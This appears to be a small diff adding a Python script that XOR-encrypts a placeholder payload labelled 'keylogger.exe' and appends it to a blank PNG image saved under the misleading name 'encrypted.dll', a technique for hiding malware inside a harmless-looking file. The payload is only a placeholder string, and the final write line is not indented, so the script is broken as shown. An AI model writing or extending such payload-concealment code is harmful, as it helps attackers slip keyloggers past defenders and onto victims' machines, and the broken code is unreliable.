@@ -1,0 +1,14 @@
+import os
+import struct
+from PIL import Image
+
+payload = b"keylogger.exe" # Replace with your payload
+key = 0xAA
+
+encrypted_data = bytes([b ^ key for b in payload])
+
+img = Image.new("RGB", (100, 100))
+img.save("encrypted.dll", "PNG")
+
+with open("encrypted.dll", "ab") as f:
+f.write(encrypted_data)
